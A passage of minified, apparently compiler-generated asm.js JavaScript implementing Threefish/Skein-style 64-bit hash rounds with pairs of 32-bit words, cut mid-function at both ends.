                Sb = Pa + (xb + 9 << 3) | 0;
                M = Sb;
                Mb = wb(c[M >> 2] | 0, c[M + 4 >> 2] | 0, (Kb | Pb) ^ Nb | 0, Mb | 0) | 0;
                Nb = y;
                Pb = Pa + (xb + 10 << 3) | 0;
                Kb = Pb;
                Jb = wb(c[Kb >> 2] | 0, c[Kb + 4 >> 2] | 0, Ib | 0, Jb | 0) | 0;
                Ib = y;
                Kb = Pa + (xb + 11 << 3) | 0;
                M = Kb;
                Eb = wb(c[M >> 2] | 0, c[M + 4 >> 2] | 0, (Cb | Hb) ^ Fb | 0, Eb | 0) | 0;
                Fb = y;
                Hb = Pa + (xb + 12 << 3) | 0;
                Cb = Hb;
                Bb = wb(c[Cb >> 2] | 0, c[Cb + 4 >> 2] | 0, K | 0, Bb | 0) | 0;
                K = y;
                Cb = Pa + (xb + 13 << 3) | 0;
                M = Cb;
                vb = _a + (xb << 3) | 0;
                kc = vb;
                C = c[kc >> 2] | 0;
                kc = c[kc + 4 >> 2] | 0;
                A = wb(c[M >> 2] | 0, c[M + 4 >> 2] | 0, O ^ (I | Db) | 0, A | 0) | 0;
                kc = wb(A | 0, y | 0, C | 0, kc | 0) | 0;
                C = y;
                A = Pa + (xb + 14 << 3) | 0;
                Db = A;
                I = c[Db >> 2] | 0;
                Db = c[Db + 4 >> 2] | 0;
                U = _a + (U << 3) | 0;
                O = U;
                M = c[O >> 2] | 0;
                O = c[O + 4 >> 2] | 0;
                da = Pa + (xb + 15 << 3) | 0;
                mc = da;
                pc = c[mc >> 2] | 0;
                mc = c[mc + 4 >> 2] | 0;
                S = wb((ub | Lb) ^ Y | 0, S | 0, xb | 0, 0) | 0;
                mc = wb(S | 0, y | 0, pc | 0, mc | 0) | 0;
                pc = y;
                S = xb + -1 | 0;
                Y = Pa + (S << 3) | 0;
                Lb = c[Y + 4 >> 2] | 0;
                ub = Pa + (xb + 16 << 3) | 0;
                Q = ub;
                c[Q >> 2] = c[Y >> 2];
                c[Q + 4 >> 2] = Lb;
                S = _a + (S << 3) | 0;
                Q = c[S >> 2] | 0;
                S = c[S + 4 >> 2] | 0;
                Lb = _a + (a << 3) | 0;
                c[Lb >> 2] = Q;
                c[Lb + 4 >> 2] = S;
                oc = wb(_ | 0, oc | 0, lc | 0, Ub | 0) | 0;
                _ = y;
                Lb = zb(lc | 0, Ub | 0, 41) | 0;
                Y = y;
                Ub = yb(lc | 0, Ub | 0, 23) | 0;
                Ub = (Lb | Ub) ^ oc;
                Y = (Y | y) ^ _;
                ic = wb(Gb | 0, ic | 0, fc | 0, gc | 0) | 0;
                Gb = y;
                Lb = zb(fc | 0, gc | 0, 9) | 0;
                lc = y;
                gc = yb(fc | 0, gc | 0, 55) | 0;
                gc = (Lb | gc) ^ ic;
                lc = (lc | y) ^ Gb;
                bc = wb(Ob | 0, bc | 0, $b | 0, ac | 0) | 0;
                Ob = y;
                Lb = zb($b | 0, ac | 0, 37) | 0;
                fc = y;
                ac = yb($b | 0, ac | 0, 27) | 0;
                ac = (Lb | ac) ^ bc;
                fc = (fc | y) ^ Ob;
                Xb = wb(G | 0, Xb | 0, aa | 0, Vb | 0) | 0;
                G = y;
                Lb = zb(aa | 0, Vb | 0, 31) | 0;
                $b = y;
                Vb = yb(aa | 0, Vb | 0, 33) | 0;
                Vb = (Lb | Vb) ^ Xb;
                $b = ($b | y) ^ G;
                Qb = wb(Rb | 0, Qb | 0, Mb | 0, Nb | 0) | 0;
                Rb = y;
                Lb = zb(Mb | 0, Nb | 0, 12) | 0;
                aa = y;
                Nb = yb(Mb | 0, Nb | 0, 52) | 0;
                Nb = (Lb | Nb) ^ Qb;
                aa = (aa | y) ^ Rb;
                Ib = wb(Jb | 0, Ib | 0, Eb | 0, Fb | 0) | 0;
                Jb = y;
                Lb = zb(Eb | 0, Fb | 0, 47) | 0;
                Mb = y;
                Fb = yb(Eb | 0, Fb | 0, 17) | 0;
                Fb = (Lb | Fb) ^ Ib;
                Mb = (Mb | y) ^ Jb;
                K = wb(Bb | 0, K | 0, kc | 0, C | 0) | 0;
                Bb = y;
                Lb = zb(kc | 0, C | 0, 44) | 0;
                Eb = y;
                C = yb(kc | 0, C | 0, 20) | 0;
                C = (Lb | C) ^ K;
                Eb = (Eb | y) ^ Bb;
                W = wb(I | 0, Db | 0, E | 0, W | 0) | 0;
                O = wb(W | 0, y | 0, M | 0, O | 0) | 0;
                O = wb(O | 0, y | 0, mc | 0, pc | 0) | 0;
                M = y;
                W = zb(mc | 0, pc | 0, 30) | 0;
                E = y;
                pc = yb(mc | 0, pc | 0, 34) | 0;
                pc = (W | pc) ^ O;
                E = (E | y) ^ M;
                _ = wb(Nb | 0, aa | 0, oc | 0, _ | 0) | 0;
                oc = y;
                W = zb(Nb | 0, aa | 0, 16) | 0;
                mc = y;
                aa = yb(Nb | 0, aa | 0, 48) | 0;
                aa = (W | aa) ^ _;
                mc = (mc | y) ^ oc;
                Gb = wb(C | 0, Eb | 0, ic | 0, Gb | 0) | 0;
                ic = y;
                W = zb(C | 0, Eb | 0, 34) | 0;
                Nb = y;
                Eb = yb(C | 0, Eb | 0, 30) | 0;
                Eb = (W | Eb) ^ Gb;
                Nb = (Nb | y) ^ ic;
                G = wb(Fb | 0, Mb | 0, Xb | 0, G | 0) | 0;
                Xb = y;
                W = zb(Fb | 0, Mb | 0, 56) | 0;
                C = y;
                Mb = yb(Fb | 0, Mb | 0, 8) | 0;
                Mb = (W | Mb) ^ G;
                C = (C | y) ^ Xb;
                Ob = wb(pc | 0, E | 0, bc | 0, Ob | 0) | 0;
                bc = y;
                W = zb(pc | 0, E | 0, 51) | 0;
                Fb = y;
                E = yb(pc | 0, E | 0, 13) | 0;
                E = (W | E) ^ Ob;
                Fb = (Fb | y) ^ bc;
                Jb = wb(Ib | 0, Jb | 0, Vb | 0, $b | 0) | 0;
                Ib = y;
                W = zb(Vb | 0, $b | 0, 4) | 0;
                pc = y;
                $b = yb(Vb | 0, $b | 0, 60) | 0;
                $b = Jb ^ (W | $b);
                pc = Ib ^ (pc | y);
                Bb = wb(K | 0, Bb | 0, gc | 0, lc | 0) | 0;
                K = y;
                W = zb(gc | 0, lc | 0, 53) | 0;
                Vb = y;
                lc = yb(gc | 0, lc | 0, 11) | 0;
                lc = Bb ^ (W | lc);
                Vb = K ^ (Vb | y);
                M = wb(O | 0, M | 0, ac | 0, fc | 0) | 0;
                O = y;
                W = zb(ac | 0, fc | 0, 42) | 0;
                gc = y;
                fc = yb(ac | 0, fc | 0, 22) | 0;
                fc = M ^ (W | fc);
                gc = O ^ (gc | y);
                Rb = wb(Qb | 0, Rb | 0, Ub | 0, Y | 0) | 0;
                Qb = y;
                W = zb(Ub | 0, Y | 0, 41) | 0;
                ac = y;
                Y = yb(Ub | 0, Y | 0, 23) | 0;
                Y = Rb ^ (W | Y);
                ac = Qb ^ (ac | y);
                oc = wb($b | 0, pc | 0, _ | 0, oc | 0) | 0;
                _ = y;
                W = zb($b | 0, pc | 0, 31) | 0;
                Ub = y;
                pc = yb($b | 0, pc | 0, 33) | 0;
                pc = (W | pc) ^ oc;
                Ub = (Ub | y) ^ _;
                ic = wb(fc | 0, gc | 0, Gb | 0, ic | 0) | 0;
                Gb = y;
                W = zb(fc | 0, gc | 0, 44) | 0;
                $b = y;
                gc = yb(fc | 0, gc | 0, 20) | 0;
                gc = (W | gc) ^ ic;
                $b = ($b | y) ^ Gb;
                bc = wb(Ob | 0, bc | 0, lc | 0, Vb | 0) | 0;
                Ob = y;
                W = zb(lc | 0, Vb | 0, 47) | 0;
                fc = y;
                Vb = yb(lc | 0, Vb | 0, 17) | 0;
                Vb = bc ^ (W | Vb);
                fc = Ob ^ (fc | y);
                Xb = wb(G | 0, Xb | 0, Y | 0, ac | 0) | 0;
                G = y;
                W = zb(Y | 0, ac | 0, 46) | 0;
                lc = y;
                ac = yb(Y | 0, ac | 0, 18) | 0;
                ac = Xb ^ (W | ac);
                lc = G ^ (lc | y);
                K = wb(E | 0, Fb | 0, Bb | 0, K | 0) | 0;
                Bb = y;
                W = zb(E | 0, Fb | 0, 19) | 0;
                Y = y;
                Fb = yb(E | 0, Fb | 0, 45) | 0;
                Fb = (W | Fb) ^ K;
                Y = (Y | y) ^ Bb;
                O = wb(Eb | 0, Nb | 0, M | 0, O | 0) | 0;
                M = y;
                W = zb(Eb | 0, Nb | 0, 42) | 0;
                E = y;
                Nb = yb(Eb | 0, Nb | 0, 22) | 0;
                Nb = (W | Nb) ^ O;
                E = (E | y) ^ M;
                Qb = wb(Mb | 0, C | 0, Rb | 0, Qb | 0) | 0;
                Rb = y;
                W = zb(Mb | 0, C | 0, 44) | 0;
                Eb = y;
                C = yb(Mb | 0, C | 0, 20) | 0;
                C = (W | C) ^ Qb;
                Eb = (Eb | y) ^ Rb;
                Ib = wb(aa | 0, mc | 0, Jb | 0, Ib | 0) | 0;
                Jb = y;
                W = zb(aa | 0, mc | 0, 25) | 0;
                Mb = y;
                mc = yb(aa | 0, mc | 0, 39) | 0;
                mc = (W | mc) ^ Ib;
                Mb = (Mb | y) ^ Jb;
                _ = wb(Fb | 0, Y | 0, oc | 0, _ | 0) | 0;
                oc = y;
                W = zb(Fb | 0, Y | 0, 9) | 0;
                aa = y;
                Y = yb(Fb | 0, Y | 0, 55) | 0;
                aa = (aa | y) ^ oc;
                Gb = wb(ic | 0, Gb | 0, C | 0, Eb | 0) | 0;
                ic = y;
                Fb = zb(C | 0, Eb | 0, 48) | 0;
                Db = y;
                Eb = yb(C | 0, Eb | 0, 16) | 0;
                Db = ic ^ (Db | y);
                G = wb(Nb | 0, E | 0, Xb | 0, G | 0) | 0;
                Xb = y;
                C = zb(Nb | 0, E | 0, 35) | 0;
                I = y;
                E = yb(Nb | 0, E | 0, 29) | 0;
                I = (I | y) ^ Xb;
                Ob = wb(bc | 0, Ob | 0, mc | 0, Mb | 0) | 0;
                bc = y;
                Nb = zb(mc | 0, Mb | 0, 52) | 0;
                Lb = y;
                Mb = yb(mc | 0, Mb | 0, 12) | 0;
                Lb = bc ^ (Lb | y);
                M = wb(O | 0, M | 0, ac | 0, lc | 0) | 0;
                O = y;
                mc = zb(ac | 0, lc | 0, 23) | 0;
                kc = y;
                lc = yb(ac | 0, lc | 0, 41) | 0;
                kc = O ^ (kc | y);
                Rb = wb(gc | 0, $b | 0, Qb | 0, Rb | 0) | 0;
                Qb = y;
                ac = zb(gc | 0, $b | 0, 31) | 0;
                _b = y;
                $b = yb(gc | 0, $b | 0, 33) | 0;
                _b = (_b | y) ^ Qb;
                Jb = wb(Vb | 0, fc | 0, Ib | 0, Jb | 0) | 0;
                Ib = y;
                gc = zb(Vb | 0, fc | 0, 37) | 0;
                ec = y;
                fc = yb(Vb | 0, fc | 0, 27) | 0;
                ec = (ec | y) ^ Ib;
                Bb = wb(K | 0, Bb | 0, pc | 0, Ub | 0) | 0;
                K = y;
                Vb = zb(pc | 0, Ub | 0, 20) | 0;
                Tb = y;
                Ub = yb(pc | 0, Ub | 0, 44) | 0;
                Tb = K ^ (Tb | y);
                g = wb(_ | 0, oc | 0, c[nc >> 2] | 0, c[nc + 4 >> 2] | 0) | 0;
                h = y;
                i = wb(M ^ (mc | lc) | 0, kc | 0, c[jc >> 2] | 0, c[jc + 4 >> 2] | 0) | 0;
                j = y;
                k = wb(Gb | 0, ic | 0, c[hc >> 2] | 0, c[hc + 4 >> 2] | 0) | 0;
                m = y;
                n = wb((gc | fc) ^ Jb | 0, ec | 0, c[dc >> 2] | 0, c[dc + 4 >> 2] | 0) | 0;
                o = y;
                p = wb(c[cc >> 2] | 0, c[cc + 4 >> 2] | 0, Ob | 0, bc | 0) | 0;
                q = y;
                r = wb((ac | $b) ^ Rb | 0, _b | 0, c[Zb >> 2] | 0, c[Zb + 4 >> 2] | 0) | 0;
                s = y;
                t = wb(c[Yb >> 2] | 0, c[Yb + 4 >> 2] | 0, G | 0, Xb | 0) | 0;
                u = y;
                v = wb(c[Wb >> 2] | 0, c[Wb + 4 >> 2] | 0, Bb ^ (Vb | Ub) | 0, Tb | 0) | 0;
                w = y;
                x = wb(c[Sb >> 2] | 0, c[Sb + 4 >> 2] | 0, Rb | 0, Qb | 0) | 0;
                z = y;
                B = wb(c[Pb >> 2] | 0, c[Pb + 4 >> 2] | 0, Ob ^ (Nb | Mb) | 0, Lb | 0) | 0;
                D = y;
                F = wb(c[Kb >> 2] | 0, c[Kb + 4 >> 2] | 0, Jb | 0, Ib | 0) | 0;
                H = y;
                J = wb(c[Hb >> 2] | 0, c[Hb + 4 >> 2] | 0, Gb ^ (Fb | Eb) | 0, Db | 0) | 0;
                L = y;
                N = wb(c[Cb >> 2] | 0, c[Cb + 4 >> 2] | 0, Bb | 0, K | 0) | 0;
                P = y;
                K = c[U >> 2] | 0;
                U = c[U + 4 >> 2] | 0;
                I = wb(c[A >> 2] | 0, c[A + 4 >> 2] | 0, (C | E) ^ G | 0, I | 0) | 0;
                R = wb(I | 0, y | 0, K | 0, U | 0) | 0;
                T = y;
                U = c[da >> 2] | 0;
                da = c[da + 4 >> 2] | 0;
                S = wb(M | 0, O | 0, Q | 0, S | 0) | 0;
                V = wb(S | 0, y | 0, U | 0, da | 0) | 0;
                X = y;
                da = c[ub >> 2] | 0;
                ub = c[ub + 4 >> 2] | 0;
                U = wb(xb | 0, 0, 1, 0) | 0;
                aa = wb(U | 0, y | 0, (W | Y) ^ _ | 0, aa | 0) | 0;
                Z = wb(aa | 0, y | 0, da | 0, ub | 0) | 0;
                $ = y;
                ub = c[tb + 4 >> 2] | 0;
                xb = Pa + (xb + 17 << 3) | 0;
                c[xb >> 2] = c[tb >> 2];
                c[xb + 4 >> 2] = ub;
                xb = c[vb + 4 >> 2] | 0;
                Ab = _a + (Ab << 3) | 0;
                c[Ab >> 2] = c[vb >> 2];
                c[Ab + 4 >> 2] = xb
            } while (a >>> 0 < 21);
            da = g ^ ba;
            ba = h ^ ca;
            aa = Oa;
            c[aa >> 2] = da;
            c[aa + 4 >> 2] = ba;
            aa = i ^ ea;
            _ = j ^ fa;
            Y = Qa;
            c[Y >> 2] = aa;
            c[Y + 4 >> 2] = _;
            Y = k ^ ga;
            W = m ^ ha;
            U = Sa;
            c[U >> 2] = Y;
            c[U + 4 >> 2] = W;
            U = n ^ ia;
            S = o ^ ja;
            Q = Ua;
            c[Q >> 2] = U;
            c[Q + 4 >> 2] = S;
            Q = p ^ ka;
            O = q ^ la;
            M = Wa;
            c[M >> 2] = Q;
            c[M + 4 >> 2] = O;
            M = r ^ ma;
            K = s ^ na;
            I = Ya;
            c[I >> 2] = M;
            c[I + 4 >> 2] = K;
            I = t ^ oa;
            G = u ^ pa;
            E = $a;
            c[E >> 2] = I;
            c[E + 4 >> 2] = G;
            E = v ^ qa;
            C = w ^ ra;
            A = bb;
            c[A >> 2] = E;
            c[A + 4 >> 2] = C;
            A = x ^ sa;
            z = z ^ ta;
            x = db;
            c[x >> 2] = A;
            c[x + 4 >> 2] = z;
            x = B ^ ua;
            w = D ^ va;
            v = fb;
            c[v >> 2] = x;
            c[v + 4 >> 2] = w;
            v = F ^ wa;
            u = H ^ xa;
            t = hb;
            c[t >> 2] = v;
            c[t + 4 >> 2] = u;
            t = J ^ ya;
            s = L ^ za;
            r = kb;
            c[r >> 2] = t;
            c[r + 4 >> 2] = s;
            r = N ^ Aa;
            q = P ^ Ba;
            p = mb;
            c[p >> 2] = r;
            c[p + 4 >> 2] = q;
            p = R ^ Ca;
            o = T ^ Da;
            n = ob;
            c[n >> 2] = p;
            c[n + 4 >> 2] = o;
            n = V ^ Ea;
            j = X ^ Fa;
            i = qb;
            c[i >> 2] = n;
            c[i + 4 >> 2] = j;
            i = Z ^ Ga;
            h = $ ^ Ha;
            a = Ia;
            c[a >> 2] = i;
            c[a + 4 >> 2] = h;
            a = Na;
            g = c[a >> 2] | 0;
            a = c[a + 4 >> 2] & -1073741825;
            pc = Na;
            c[pc >> 2] = g;
            c[pc + 4 >> 2] = a;
            e = e + -1 | 0;
            if (!e) break;
            m = _a;
            b = b + 128 | 0;
            k = c[m >> 2] | 0;
            m = c[m + 4 >> 2] | 0;
            B = ba
        }
        nc = _a;
        oc = c[nc + 4 >> 2] | 0;
        pc = jb;
        c[pc >> 2] = c[nc >> 2];
        c[pc + 4 >> 2] = oc;
        pc = Ma;
        c[pc >> 2] = g;
        c[pc + 4 >> 2] = a;
        l = sb;
        return
    }

    function Ta(a, b, e, f) {
        a = a | 0;
        b = b | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0,
            T = 0,
            U = 0,
            V = 0,
            W = 0,
            X = 0,
            Y = 0,
            Z = 0,
            _ = 0,
            $ = 0,
            aa = 0,
            ba = 0,
            ca = 0,
            da = 0,
            ea = 0,
            fa = 0,
            ga = 0,
            ha = 0,
            ia = 0;
        A = a + 8 | 0;
        u = A;
        B = c[u >> 2] | 0;
        u = c[u + 4 >> 2] | 0;
        v = a + 16 | 0;
        q = v;
        p = c[q >> 2] | 0;
        q = c[q + 4 >> 2] | 0;
        w = a + 24 | 0;
        x = a + 32 | 0;
        z = a + 40 | 0;
        r = a + 48 | 0;
        s = wb(e + -1 | 0, 0, 1, 0) | 0;
        s = Bb(s | 0, y | 0, f | 0, 0) | 0;
        t = y;
        i = w;
        k = x;
        m = z;
        o = r;
        a = B;
        g = u;
        h = c[i >> 2] | 0;
        i = c[i + 4 >> 2] | 0;
        j = c[k >> 2] | 0;
        k = c[k + 4 >> 2] | 0;
        l = c[m >> 2] | 0;
        m = c[m + 4 >> 2] | 0;
        n = c[o >> 2] | 0;
        o = c[o + 4 >> 2] | 0;
        while (1) {
            a = wb(a | 0, g | 0, f | 0, 0) | 0;
            g = y;
            $ = h ^ -1443096030 ^ j ^ l ^ n;
            Y = i ^ 466688986 ^ k ^ m ^ o;
            E = a ^ p;
            da = g ^ q;
            N = b;
            P = N;
            P = d[P >> 0] | d[P + 1 >> 0] << 8 | d[P + 2 >> 0] << 16 | d[P + 3 >> 0] << 24;
            N = N + 4 | 0;
            N = d[N >> 0] | d[N + 1 >> 0] << 8 | d[N + 2 >> 0] << 16 | d[N + 3 >> 0] << 24;
            J = b + 8 | 0;
            L = J;
            L = d[L >> 0] | d[L + 1 >> 0] << 8 | d[L + 2 >> 0] << 16 | d[L + 3 >> 0] << 24;
            J = J + 4 | 0;
            J = d[J >> 0] | d[J + 1 >> 0] << 8 | d[J + 2 >> 0] << 16 | d[J + 3 >> 0] << 24;
            F = b + 16 | 0;
            H = F;
            H = d[H >> 0] | d[H + 1 >> 0] << 8 | d[H + 2 >> 0] << 16 | d[H + 3 >> 0] << 24;
            F = F + 4 | 0;
            F = d[F >> 0] | d[F + 1 >> 0] << 8 | d[F + 2 >> 0] << 16 | d[F + 3 >> 0] << 24;
            C = b + 24 | 0;
            D = C;
            D = d[D >> 0] | d[D + 1 >> 0] << 8 | d[D + 2 >> 0] << 16 | d[D + 3 >> 0] << 24;
            C = C + 4 | 0;
            C = d[C >> 0] | d[C + 1 >> 0] << 8 | d[C + 2 >> 0] << 16 | d[C + 3 >> 0] << 24;
            _ = wb(P | 0, N | 0, h | 0, i | 0) | 0;
            Q = y;
            ba = wb(j | 0, k | 0, a | 0, g | 0) | 0;
            S = y;
            R = wb(ba | 0, S | 0, L | 0, J | 0) | 0;
            ga = y;
            X = wb(D | 0, C | 0, n | 0, o | 0) | 0;
            G = y;
            Q = wb(_ | 0, Q | 0, R | 0, ga | 0) | 0;
            _ = y;
            Z = zb(R | 0, ga | 0, 14) | 0;
            ha = y;
            ga = yb(R | 0, ga | 0, 50) | 0;
            ga = (Z | ga) ^ Q;
            ha = (ha | y) ^ _;
            Z = wb(l | 0, m | 0, p | 0, q | 0) | 0;
            R = y;
            V = wb(Z | 0, R | 0, H | 0, F | 0) | 0;
            V = wb(V | 0, y | 0, X | 0, G | 0) | 0;
            U = y;
            W = zb(X | 0, G | 0, 16) | 0;
            ea = y;
            G = yb(X | 0, G | 0, 48) | 0;
            G = (W | G) ^ V;
            ea = (ea | y) ^ U;
            _ = wb(G | 0, ea | 0, Q | 0, _ | 0) | 0;
            Q = y;
            W = zb(G | 0, ea | 0, 52) | 0;
            X = y;
            ea = yb(G | 0, ea | 0, 12) | 0;
            ea = (W | ea) ^ _;
            X = (X | y) ^ Q;
            U = wb(ga | 0, ha | 0, V | 0, U | 0) | 0;
            V = y;
            W = zb(ga | 0, ha | 0, 57) | 0;
            G = y;
            ha = yb(ga | 0, ha | 0, 7) | 0;
            ha = (W | ha) ^ U;
            G = (G | y) ^ V;
            Q = wb(ha | 0, G | 0, _ | 0, Q | 0) | 0;
            _ = y;
            W = zb(ha | 0, G | 0, 23) | 0;
            ga = y;
            G = yb(ha | 0, G | 0, 41) | 0;
            G = (W | G) ^ Q;
            ga = (ga | y) ^ _;
            V = wb(ea | 0, X | 0, U | 0, V | 0) | 0;
            U = y;
            W = zb(ea | 0, X | 0, 40) | 0;
            ha = y;
            X = yb(ea | 0, X | 0, 24) | 0;
            X = (W | X) ^ V;
            ha = (ha | y) ^ U;
            _ = wb(X | 0, ha | 0, Q | 0, _ | 0) | 0;
            Q = y;
            W = zb(X | 0, ha | 0, 5) | 0;
            ea = y;
            ha = yb(X | 0, ha | 0, 59) | 0;
            ea = (ea | y) ^ Q;
            U = wb(G | 0, ga | 0, V | 0, U | 0) | 0;
            V = y;
            X = zb(G | 0, ga | 0, 37) | 0;
            T = y;
            ga = yb(G | 0, ga | 0, 27) | 0;
            T = (T | y) ^ V;
            Q = wb(_ | 0, Q | 0, j | 0, k | 0) | 0;
            G = y;
            T = wb((X | ga) ^ U | 0, T | 0, Z | 0, R | 0) | 0;
            ga = y;
            X = wb(n | 0, o | 0, E | 0, da | 0) | 0;
            O = y;
            V = wb(U | 0, V | 0, X | 0, O | 0) | 0;
            U = y;
            K = wb($ | 0, Y | 0, 1, 0) | 0;
            ea = wb(K | 0, y | 0, (W | ha) ^ _ | 0, ea | 0) | 0;
            _ = y;
            G = wb(Q | 0, G | 0, T | 0, ga | 0) | 0;
            Q = y;
            ha = zb(T | 0, ga | 0, 25) | 0;
            W = y;
            ga = yb(T | 0, ga | 0, 39) | 0;
            ga = (ha | ga) ^ G;
            W = (W | y) ^ Q;
            U = wb(V | 0, U | 0, ea | 0, _ | 0) | 0;
            V = y;
            ha = zb(ea | 0, _ | 0, 33) | 0;
            T = y;
            _ = yb(ea | 0, _ | 0, 31) | 0;
            _ = (ha | _) ^ U;
            T = (T | y) ^ V;
            Q = wb(_ | 0, T | 0, G | 0, Q | 0) | 0;
            G = y;
            ha = zb(_ | 0, T | 0, 46) | 0;
            ea = y;
            T = yb(_ | 0, T | 0, 18) | 0;
            T = (ha | T) ^ Q;
            ea = (ea | y) ^ G;
            V = wb(ga | 0, W | 0, U | 0, V | 0) | 0;
            U = y;
            ha = zb(ga | 0, W | 0, 12) | 0;
            _ = y;
            W = yb(ga | 0, W | 0, 52) | 0;
            W = (ha | W) ^ V;
            _ = (_ | y) ^ U;
            G = wb(W | 0, _ | 0, Q | 0, G | 0) | 0;
            Q = y;
            ha = zb(W | 0, _ | 0, 58) | 0;
            ga = y;
            _ = yb(W | 0, _ | 0, 6) | 0;
            _ = (ha | _) ^ G;
            ga = (ga | y) ^ Q;
            U = wb(T | 0, ea | 0, V | 0, U | 0) | 0;
            V = y;
            ha = zb(T | 0, ea | 0, 22) | 0;
            W = y;
            ea = yb(T | 0, ea | 0, 42) | 0;
            ea = (ha | ea) ^ U;
            W = (W | y) ^ V;
            Q = wb(ea | 0, W | 0, G | 0, Q | 0) | 0;
            G = y;
            V = wb(_ | 0, ga | 0, U | 0, V | 0) | 0;
            U = y;
            ha = wb(Q | 0, G | 0, l | 0, m | 0) | 0;
            T = y;
            _ = wb(ga ^ V | 0, _ ^ U | 0, X | 0, O | 0) | 0;
            ga = y;
            K = wb($ | 0, Y | 0, a | 0, g | 0) | 0;
            M = y;
            U = wb(V | 0, U | 0, K | 0, M | 0) | 0;
            V = y;
            fa = wb(h | 0, i | 0, 2, 0) | 0;
            G = wb(fa | 0, y | 0, W ^ Q | 0, ea ^ G | 0) | 0;
            ea = y;
            T = wb(ha | 0, T | 0, _ | 0, ga | 0) | 0;
            ha = y;
            Q = zb(_ | 0, ga | 0, 14) | 0;
            W = y;
            ga = yb(_ | 0, ga | 0, 50) | 0;
            ga = (Q | ga) ^ T;
            W = (W | y) ^ ha;
            V = wb(U | 0, V | 0, G | 0, ea | 0) | 0;
            U = y;
            Q = zb(G | 0, ea | 0, 16) | 0;
            _ = y;
            ea = yb(G | 0, ea | 0, 48) | 0;
            ea = (Q | ea) ^ V;
            _ = (_ | y) ^ U;
            ha = wb(ea | 0, _ | 0, T | 0, ha | 0) | 0;
            T = y;
            Q = zb(ea | 0, _ | 0, 52) | 0;
            G = y;
            _ = yb(ea | 0, _ | 0, 12) | 0;
            _ = (Q | _) ^ ha;
            G = (G | y) ^ T;
            U = wb(ga | 0, W | 0, V | 0, U | 0) | 0;
            V = y;
            Q = zb(ga | 0, W | 0, 57) | 0;
            ea = y;
            W = yb(ga | 0, W | 0, 7) | 0;
            W = (Q | W) ^ U;
            ea = (ea | y) ^ V;
            T = wb(W | 0, ea | 0, ha | 0, T | 0) | 0;
            ha = y;
            Q = zb(W | 0, ea | 0, 23) | 0;
            ga = y;
            ea = yb(W | 0, ea | 0, 41) | 0;
            ea = (Q | ea) ^ T;
            ga = (ga | y) ^ ha;
            V = wb(_ | 0, G | 0, U | 0, V | 0) | 0;
            U = y;
            Q = zb(_ | 0, G | 0, 40) | 0;
            W = y;
            G = yb(_ | 0, G | 0, 24) | 0;
            G = (Q | G) ^ V;
            W = (W | y) ^ U;
            ha = wb(G | 0, W | 0, T | 0, ha | 0) | 0;
            T = y;
            Q = zb(G | 0, W | 0, 5) | 0;
            _ = y;
            W = yb(G | 0, W | 0, 59) | 0;
            _ = (_ | y) ^ T;
            U = wb(ea | 0, ga | 0, V | 0, U | 0) | 0;
            V = y;
            G = zb(ea | 0, ga | 0, 37) | 0;
            fa = y;
            ga = yb(ea | 0, ga | 0, 27) | 0;
            fa = (fa | y) ^ V;
            T = wb(ha | 0, T | 0, n | 0, o | 0) | 0;
            ea = y;
            fa = wb((G | ga) ^ U | 0, fa | 0, K | 0, M | 0) | 0;
            ga = y;
            G = wb(h | 0, i | 0, p | 0, q | 0) | 0;
            I = y;
            V = wb(U | 0, V | 0, G | 0, I | 0) | 0;
            U = y;
            aa = wb(j | 0, k | 0, 3, 0) | 0;
            _ = wb(aa | 0, y | 0, (Q | W) ^ ha | 0, _ | 0) | 0;
            ha = y;
            ea = wb(T | 0, ea | 0, fa | 0, ga | 0) | 0;
            T = y;
            W = zb(fa | 0, ga | 0, 25) | 0;
            Q = y;
            ga = yb(fa | 0, ga | 0, 39) | 0;
            ga = (W | ga) ^ ea;
            Q = (Q | y) ^ T;
            U = wb(V | 0, U | 0, _ | 0, ha | 0) | 0;
            V = y;
            W = zb(_ | 0, ha | 0, 33) | 0;
            fa = y;
            ha = yb(_ | 0, ha | 0, 31) | 0;
            ha = (W | ha) ^ U;
            fa = (fa | y) ^ V;
            T = wb(ha | 0, fa | 0, ea | 0, T | 0) | 0;
            ea = y;
            W = zb(ha | 0, fa | 0, 46) | 0;
            _ = y;
            fa = yb(ha | 0, fa | 0, 18) | 0;
            fa = (W | fa) ^ T;
            _ = (_ | y) ^ ea;
            V = wb(ga | 0, Q | 0, U | 0, V | 0) | 0;
            U = y;
            W = zb(ga | 0, Q | 0, 12) | 0;
            ha = y;
            Q = yb(ga | 0, Q | 0, 52) | 0;
            Q = (W | Q) ^ V;
            ha = (ha | y) ^ U;
            ea = wb(Q | 0, ha | 0, T | 0, ea | 0) | 0;
            T = y;
            W = zb(Q | 0, ha | 0, 58) | 0;
            ga = y;
            ha = yb(Q | 0, ha | 0, 6) | 0;
            ha = (W | ha) ^ ea;
            ga = (ga | y) ^ T;
            U = wb(fa | 0, _ | 0, V | 0, U | 0) | 0;
            V = y;
            W = zb(fa | 0, _ | 0, 22) | 0;
            Q = y;
            _ = yb(fa | 0, _ | 0, 42) | 0;
            _ = (W | _) ^ U;
            Q = (Q | y) ^ V;
            T = wb(_ | 0, Q | 0, ea | 0, T | 0) | 0;
            ea = y;
            V = wb(ha | 0, ga | 0, U | 0, V | 0) | 0;
            U = y;
            W = wb(T | 0, ea | 0, $ | 0, Y | 0) | 0;
            fa = y;
            ha = wb(ga ^ V | 0, ha ^ U | 0, G | 0, I | 0) | 0;
            ga = y;
            aa = wb(j | 0, k | 0, E | 0, da | 0) | 0;
            ca = y;
            U = wb(V | 0, U | 0, aa | 0, ca | 0) | 0;
            V = y;
            ia = wb(l | 0, m | 0, 4, 0) | 0;
            ea = wb(ia | 0, y | 0, Q ^ T | 0, _ ^ ea | 0) | 0;
            _ = y;
            fa = wb(W | 0, fa | 0, ha | 0, ga | 0) | 0;
            W = y;
            T = zb(ha | 0, ga | 0, 14) | 0;
            Q = y;
            ga = yb(ha | 0, ga | 0, 50) | 0;
            ga = (T | ga) ^ fa;
            Q = (Q | y) ^ W;
            V = wb(U | 0, V | 0, ea | 0, _ | 0) | 0;
            U = y;
